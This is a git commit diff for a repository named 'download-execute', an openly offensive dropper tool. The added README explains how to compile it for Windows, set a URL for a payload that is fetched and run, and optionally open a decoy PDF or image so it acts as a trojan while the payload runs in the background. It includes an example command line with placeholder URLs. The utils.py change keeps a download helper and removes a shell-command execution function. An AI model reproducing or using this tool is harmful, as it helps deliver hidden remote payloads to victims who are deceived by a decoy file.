24ffe329b59273eacaf35f02dd3289fa8d18737e
Sam Hilliard <samhilliard51@gmail.com>
2022-01-18 18:50:03 -0800

    updated readme

--- README.md
+++ README.md
@@ -1,2 +1,11 @@
 # download-execute
 Downloads and executes payloads of your choosing.
+
+# Usage
+Compile into an executable of your choosing (tested on Windows).
+Before compiling, make sure the argument -p is set to the URL of
+the payload you want to download and execute. An optional -t argument
+can be set which can act as a trojan by supplying the url an image or a pdf
+to open while the payload runs in the background.
+
+Example: `python3 download_execute.py -t <url-pdf>.pdf -p <payload-url>.exe`
--- utils.py
+++ utils.py
@@ -1,6 +1,5 @@
 """
-Common utilities that can be used across different
-applications.
+Common utilities.
 """
 
 import requests
@@ -11,12 +10,3 @@ def download(url, filename):
     r = requests.get(url)
     with open(filename, "wb") as f:
         f.write(r.content)
-
-# executes a command and returns the output
-def execute_cmd(cmd):
-    output = subprocess.run(cmd.split(" "), capture_output=True, shell=True)
-
-    if output.returncode == 0:
-        return output.stdout.decode('utf-8')
-    else:
-        return output.stderr.decode('utf-8')
